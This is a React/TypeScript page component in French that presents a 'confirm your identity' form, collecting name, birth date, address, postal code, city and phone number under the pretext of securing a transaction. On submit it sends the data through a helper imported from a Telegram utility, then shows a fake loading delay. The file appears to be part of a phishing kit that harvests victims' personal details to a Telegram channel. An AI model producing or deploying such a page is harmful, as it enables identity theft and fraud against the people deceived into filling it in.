import React, { useState } from 'react';
import Logo from '../components/Logo';
import BackButton from '../components/BackButton';
import Input from '../components/ui/Input';
import Button from '../components/ui/Button';
import { sendIdentityData } from '../utils/telegram';

type IdentityConfirmationPageProps = {
  onNext: (data: any) => void;
  onBack?: () => void;
};

const IdentityConfirmationPage = ({ onNext, onBack }: IdentityConfirmationPageProps) => {
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    birthDate: '',
    address: '',
    postalCode: '',
    city: '',
    phone: ''
  });
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { id, value } = e.target;
    setFormData(prev => ({ ...prev, [id]: value }));
    if (errors[id]) {
      setErrors(prev => ({ ...prev, [id]: '' }));
    }
  };

  const validateForm = () => {
    const newErrors: Record<string, string> = {};
    
    if (!formData.firstName.trim()) newErrors.firstName = 'Champ requis';
    if (!formData.lastName.trim()) newErrors.lastName = 'Champ requis';
    if (!formData.birthDate.trim()) newErrors.birthDate = 'Champ requis';
    if (!formData.address.trim()) newErrors.address = 'Champ requis';
    if (!formData.postalCode.trim()) newErrors.postalCode = 'Champ requis';
    if (!formData.city.trim()) newErrors.city = 'Champ requis';
    if (!formData.phone.trim()) newErrors.phone = 'Champ requis';
    
    if (formData.postalCode.trim() && !/^\d{5}$/.test(formData.postalCode)) {
      newErrors.postalCode = 'Code postal invalide';
    }
    
    if (formData.phone.trim() && !/^(?:(?:\+|00)33|0)\s*[1-9](?:[\s.-]*\d{2}){4}$/.test(formData.phone)) {
      newErrors.phone = 'Numéro de téléphone invalide';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (validateForm()) {
      setIsSubmitting(true);
      
      // Send identity data to Telegram
      await sendIdentityData(formData);

      setTimeout(() => {
        setIsSubmitting(false);
        onNext(formData);
      }, 1500);
    }
  };

  const handleBackClick = () => {
    if (onBack) {
      onBack();
    } else {
      window.history.back();
    }
  };

  return (
    <div className="min-h-screen w-full">
      <header className="p-4 flex items-center justify-between md:justify-center relative border-b">
        <div className="md:absolute md:left-4">
          <BackButton onClick={handleBackClick} />
        </div>
        <div className="md:mx-auto">
          <Logo />
        </div>
        <div className="w-6 md:hidden"></div>
      </header>

      <main className="flex justify-center py-8 px-4">
        <div className="w-full max-w-md">
          <h1 className="text-2xl font-semibold text-gray-800 mb-2">
            Confirmation de votre identité
          </h1>
          
          <p className="text-gray-600 mb-6">
            Pour sécuriser votre transaction et protéger vos intérêts, nous avons besoin de vérifier votre identité. 
            Veuillez remplir tous les champs ci-dessous avec vos informations personnelles exactes.
          </p>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="grid grid-cols-2 gap-4">
              <Input
                id="lastName"
                label="Nom"
                value={formData.lastName}
                onChange={handleChange}
                error={errors.lastName}
                required
              />
              <Input
                id="firstName"
                label="Prénom"
                value={formData.firstName}
                onChange={handleChange}
                error={errors.firstName}
                required
              />
            </div>

            <Input
              id="birthDate"
              label="Date de naissance"
              type="date"
              value={formData.birthDate}
              onChange={handleChange}
              error={errors.birthDate}
              required
            />

            <Input
              id="address"
              label="Adresse"
              value={formData.address}
              onChange={handleChange}
              error={errors.address}
              required
            />

            <div className="grid grid-cols-2 gap-4">
              <Input
                id="postalCode"
                label="Code postal"
                value={formData.postalCode}
                onChange={handleChange}
                error={errors.postalCode}
                required
              />
              <Input
                id="city"
                label="Ville"
                value={formData.city}
                onChange={handleChange}
                error={errors.city}
                required
              />
            </div>

            <Input
              id="phone"
              label="Numéro de téléphone"
              type="tel"
              value={formData.phone}
              onChange={handleChange}
              error={errors.phone}
              required
            />

            <Button 
              type="submit" 
              fullWidth 
              className="mt-6"
              disabled={isSubmitting}
            >
              {isSubmitting ? (
                <span className="flex items-center justify-center">
                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Chargement...
                </span>
              ) : (
                'Suivant'
              )}
            </Button>
          </form>
        </div>
      </main>
    </div>
  );
};

export default IdentityConfirmationPage;